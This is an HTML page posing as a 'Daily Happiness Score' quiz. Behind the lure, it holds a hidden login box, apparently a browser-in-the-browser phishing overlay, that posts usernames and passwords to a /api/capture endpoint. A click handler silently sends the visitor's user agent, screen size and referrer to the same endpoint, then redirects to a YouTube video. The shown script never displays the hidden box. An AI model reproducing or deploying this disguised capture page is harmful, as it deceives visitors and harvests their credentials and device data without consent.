<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daily Happiness Score</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; margin: 0; background: #f5f5f5; }
        h1 { color: #333; }
        button { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #ff4757; color: white; border: none; border-radius: 10px; transition: background 0.2s; }
        button:hover { background: #e84118; }
    </style>
</head>
<body>
       <div id="bitb" style="display:none; position:fixed; top:20%; left:30%; background:white; padding:20px; border:1px solid #ccc;">
        <h3>Login to continue</h3>
        <form action="/api/capture" method="POST">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
    <h1>Are you happy with the day?</h1>
    <button onclick="captureAndRedirect()">Click to see your score!</button>

    <script>
        async function captureAndRedirect() {
            const data = {
                userAgent: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            };

            try {
                await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) {
                console.error('Capture failed', e);
            }

            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        }
    </script>
</body>
</html>
